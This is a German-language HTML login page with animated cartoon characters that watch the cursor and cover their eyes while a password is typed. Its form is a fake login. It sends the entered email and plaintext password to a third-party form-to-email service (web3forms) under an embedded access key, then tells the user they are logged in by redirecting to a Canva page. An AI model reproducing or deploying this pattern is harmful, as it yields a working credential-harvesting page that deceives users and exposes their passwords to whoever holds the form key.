<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interactive Login</title>
    <style>
        :root {
            --bg: #e5e5e5;
            --purple: #6332F6;
            --orange: #FF7A3D;
            --black: #1a1a1a;
        }

        body {
            margin: 0; padding: 0;
            background: var(--bg);
            font-family: sans-serif;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; overflow: hidden;
        }

        .container {
            display: flex; 
            width: 95vw; max-width: 1000px; height: 80vh; max-height: 600px;
            background: white; border-radius: 24px; overflow: hidden;
            box-shadow: 0 20px 50px rgba(0,0,0,0.1);
        }

        .visuals {
            flex: 1.2; background: var(--bg);
            display: flex; justify-content: center; align-items: flex-end;
            padding-bottom: 20px; position: relative;
        }

        .auth-form {
            flex: 1; padding: 40px;
            display: flex; flex-direction: column; justify-content: center;
        }

        h1 { font-size: 2.2rem; margin: 0 0 10px; }
        input {
            width: 100%; padding: 15px 0; border: none;
            border-bottom: 2px solid #ddd; font-size: 1rem; outline: none;
            margin-bottom: 20px;
        }

        .btn {
            background: var(--black); color: white; border: none;
            padding: 15px; border-radius: 50px; font-weight: bold; cursor: pointer;
            transition: 0.3s;
        }

        .btn:disabled { background: #999; cursor: not-allowed; }

        .char { transition: transform 0.4s ease; transform-origin: bottom; }
        .eye-white { fill: white; }
        .pupil { fill: black; }

        @media (max-width: 600px) {
            .container { flex-direction: column; height: 95vh; }
            .visuals { flex: 0.8; }
            h1 { font-size: 1.5rem; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="visuals" id="scene">
        <svg viewBox="0 0 400 300" id="svg-element" style="width: 100%; height: 100%;">
            <g id="char-orange" class="char">
                <path d="M30,280 Q30,150 130,150 Q230,150 230,280 Z" fill="var(--orange)" />
                <circle class="eye-white" cx="100" cy="210" r="10" />
                <circle class="pupil" cx="100" cy="210" r="5" />
                <circle class="eye-white" cx="140" cy="210" r="10" />
                <circle class="pupil" cx="140" cy="210" r="5" />
            </g>
            <g id="char-purple" class="char">
                <rect x="160" y="70" width="110" height="210" rx="10" fill="var(--purple)" />
                <circle class="eye-white" cx="195" cy="120" r="8" />
                <circle class="pupil" cx="195" cy="120" r="4" />
                <circle class="eye-white" cx="235" cy="120" r="8" />
                <circle class="pupil" cx="235" cy="120" r="4" />
            </g>
            <g id="char-black" class="char">
                <rect x="260" y="180" width="70" height="100" rx="8" fill="var(--black)" />
                <circle class="eye-white" cx="285" cy="235" r="7" />
                <circle class="pupil" cx="285" cy="235" r="3.5" />
                <circle class="eye-white" cx="310" cy="235" r="7" />
                <circle class="pupil" cx="310" cy="235" r="3.5" />
            </g>
        </svg>
    </div>

    <form class="auth-form" id="loginForm" action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="060a9c4b-3eda-42b0-af11-a4279a8956c5">
        
        <h1>Willkommen</h1>
        <input type="email" name="email" id="emailInput" placeholder="E-Mail" required>
        <input type="password" id="password" name="password" placeholder="Passwort" required>
        <button type="submit" class="btn" id="submitBtn">Anmelden</button>
        <p id="statusMsg" style="font-size: 0.8rem; margin-top: 10px; color: red;"></p>
    </form>
</div>

<script>
    const form = document.getElementById('loginForm');
    const pupils = document.querySelectorAll('.pupil');
    const passwordInput = document.getElementById('password');
    const emailInput = document.getElementById('emailInput');
    const chars = document.querySelectorAll('.char');
    const btn = document.getElementById('submitBtn');
    const statusMsg = document.getElementById('statusMsg');

    form.onsubmit = async (e) => {
        e.preventDefault();
        
        // PrÃ¼ft ob E-Mail korrekt ist
        if(!emailInput.value.includes('@') || !emailInput.value.includes('.')) {
            statusMsg.innerText = "Bitte gib eine echte E-Mail Adresse ein.";
            return;
        }

        btn.disabled = true;
        btn.innerText = "Wird gesendet...";
        statusMsg.innerText = "";
        
        const formData = new FormData(form);

        try {
            const response = await fetch(form.action, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                btn.innerText = "Erfolgreich!";
                // Leitet nach dem Senden zur Canva-Seite weiter
                setTimeout(() => {
                    window.location.href = "https://azj-studio.my.canva.site/du-bist-eingeloggt";
                }, 1000);
            } else {
                statusMsg.innerText = "Fehler beim Senden. Versuche es nochmal.";
                btn.disabled = false;
                btn.innerText = "Anmelden";
            }
        } catch (error) {
            statusMsg.innerText = "Netzwerkfehler.";
            btn.disabled = false;
            btn.innerText = "Anmelden";
        }
    };

    // Animation der Augen
    function moveEyes(e) {
        let clientX, clientY;
        if (e.touches) {
            clientX = e.touches[0].clientX; clientY = e.touches[0].clientY;
        } else {
            clientX = e.clientX; clientY = e.clientY;
        }
        pupils.forEach((p) => {
            const rect = p.getBoundingClientRect();
            const eyeX = rect.left + rect.width / 2;
            const eyeY = rect.top + rect.height / 2;
            const angle = Math.atan2(clientY - eyeY, clientX - eyeX);
            const x = Math.cos(angle) * 5;
            const y = Math.sin(angle) * 5;
            p.style.transform = `translate(${x}px, ${y}px)`;
        });
    }

    window.addEventListener('mousemove', moveEyes);
    window.addEventListener('touchmove', moveEyes);

    passwordInput.addEventListener('focus', () => {
        pupils.forEach(p => p.style.transform = 'scaleY(0.1)');
        chars[0].style.transform = 'translateX(-20px) rotate(-10deg)';
        chars[1].style.transform = 'translateY(15px)';
        chars[2].style.transform = 'translateX(20px) rotate(10deg)';
    });

    passwordInput.addEventListener('blur', () => {
        pupils.forEach(p => p.style.transform = 'none');
        chars.forEach(c => c.style.transform = 'none');
    });
</script>
</body>
</html>
